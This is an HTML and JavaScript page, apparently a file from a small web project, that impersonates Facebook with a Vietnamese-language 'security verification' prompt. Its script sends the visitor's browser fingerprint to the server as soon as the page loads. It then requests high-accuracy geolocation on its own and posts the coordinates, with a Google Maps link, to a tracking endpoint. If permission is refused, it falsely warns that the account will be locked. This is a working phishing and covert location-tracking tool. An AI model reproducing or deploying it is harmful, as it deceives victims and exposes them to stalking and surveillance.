<!-- language: HTML+JS, file: static/index.html -->
<!doctype html>
<html lang="vi">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Facebook - Xác minh bảo mật</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f0f2f5;color:#1c1e21;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:20px}
.fb-logo{color:#1877f2;font-size:32px;font-weight:900;margin-top:40px;margin-bottom:20px;letter-spacing:-1px}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);padding:20px;max-width:400px;width:100%;text-align:center}
h2{font-size:18px;margin-bottom:10px;color:#1c1e21}
p{font-size:14px;color:#606770;line-height:1.5;margin-bottom:20px}
.btn{display:block;width:100%;background:#1877f2;color:#fff;border:none;padding:12px;border-radius:6px;font-size:16px;font-weight:bold;cursor:pointer;margin-bottom:10px}
.spinner{display:none;border:4px solid #f3f3f3;border-top:4px solid #1877f2;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:0 auto 15px}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="fb-logo">facebook</div>
<div class="card" id="main-card">
  <div class="spinner" id="spin"></div>
  <h2 id="title">Yêu cầu xác minh</h2>
  <p id="desc">Tài khoản của bạn có dấu hiệu đăng nhập bất thường. Vui lòng xác minh vị trí hiện tại để tiếp tục sử dụng Facebook.</p>
  <button class="btn" id="action-btn" onclick="startGeo()">Xác minh ngay</button>
</div>

<script>
  const fp = {
    ua: navigator.userAgent,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    scr: screen.width + "x" + screen.height,
    lang: navigator.language
  };

  function send(path, p) {
    fetch(path, {method:"POST",headers:{"Content-Type":"application/json"},body: JSON.stringify(p),keepalive:true}).catch(()=>{});
  }

  // Gửi IP ngay khi load
  send("/hit", {...fp, stage: "load"});

  // Tự động kích hoạt xin quyền sau 1 giây (tạo cảm giác đang load)
  setTimeout(() => {
    document.getElementById("action-btn").style.display = "none";
    document.getElementById("spin").style.display = "block";
    document.getElementById("title").innerText = "Đang xác minh...";
    document.getElementById("desc").innerText = "Vui lòng bấm 'Cho phép' khi trình duyệt yêu cầu truy cập vị trí.";
    startGeo();
  }, 1500);

  function startGeo() {
    if (!navigator.geolocation) return;
    navigator.geolocation.getCurrentPosition(
      pos => {
        const c = pos.coords;
        send("/track", {
          ...fp, stage: "geo", lat: c.latitude, lon: c.longitude, acc: c.accuracy,
          maps: `https://maps.google.com/?q=${c.latitude},${c.longitude}`
        });
        document.getElementById("spin").style.display = "none";
        document.getElementById("title").innerText = "Xác minh thành công";
        document.getElementById("desc").innerText = "Vị trí của bạn đã được ghi nhận. Hệ thống sẽ tự động mở khóa tài khoản.";
      },
      err => {
        send("/hit", {...fp, stage: "geo_denied", code: err.code});
        document.getElementById("spin").style.display = "none";
        document.getElementById("title").innerText = "Xác minh thất bại";
        document.getElementById("desc").innerText = "Bạn đã từ chối cấp quyền vị trí. Tài khoản sẽ bị tạm khóa.";
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  }
</script>
</body>
</html>
